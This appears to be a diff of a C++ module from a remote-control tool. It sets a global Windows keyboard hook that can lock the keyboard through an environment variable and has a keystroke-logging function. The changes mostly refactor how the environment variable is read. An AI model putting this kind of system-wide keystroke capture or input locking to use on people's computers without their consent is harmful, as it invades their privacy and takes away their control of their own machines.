@@ -1,8 +1,9 @@
 #include "keyboard.h"
 
+#define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for
+
 HHOOK ghHook;
 KBDLLHOOKSTRUCT kbdStruct;
-const wchar_t *KB_ENV = L"RCDO_KBLOCK"; // name of environment variable to search for
 
 int KeyboardMod::requireAdmin() {
     return 0;
@@ -10,7 +11,7 @@ int KeyboardMod::requireAdmin() {
 
 void KeyboardMod::start() {
 
-    if(setHook()) { 
+    if(setHook()) {
         return;
     }
 
@@ -29,7 +30,7 @@ void KeyboardMod::kill() {
 }
 
 bool setHook() {
-   
+
     // set the keyboard hook for all processes on the computer
     // runs the hookCallback function when hooked is triggered
     if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
@@ -42,7 +43,7 @@ bool setHook() {
 
 }
 
-bool releaseHook() { 
+bool releaseHook() {
 
     return UnhookWindowsHookEx(ghHook);
 
@@ -73,22 +74,25 @@ void logKeystroke(int vkCode) {
 
 LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     // function handler for all keyboard strokes
-    
-    size_t requiredSize;
-    wchar_t *buffer;
-    errno_t errNo = _wgetenv_s(&requiredSize, buffer, 0, KB_ENV);
 
-    if(errNo || !requiredSize) {
-        // error handling if _wgetenv_s fails
-        // OR the required ENV is not set on the system
-        wprintf(L"%s\n", "[ERROR] Could not find the required environment value, exiting!");
-        
-        releaseHook();
 
-        exit(1);
-    }
-    
-    long int keyboardLocked = wcstol(buffer, NULL, 2);
+    // YR: I leave this here just in case u don't like this new logic
+    // size_t requiredSize;
+    // wchar_t *buffer;
+    // errno_t errNo = _wgetenv_s(&requiredSize, buffer, 0, KB_ENV);
+    // if(errNo || !requiredSize) {
+    //     // error handling if _wgetenv_s fails
+    //     // OR the required ENV is not set on the system
+    //     wprintf(L"%s\n", "[ERROR] Could not find the required environment value, exiting!");
+
+    //     releaseHook();
+
+    //     exit(1);
+    // }
+
+    std::wstring buffer = getEnvVar(KB_ENV, L"0");
+
+    long int keyboardLocked = wcstol(buffer.c_str(), NULL, 2);
 
     if(keyboardLocked) {
         if(nCode >= 0) {
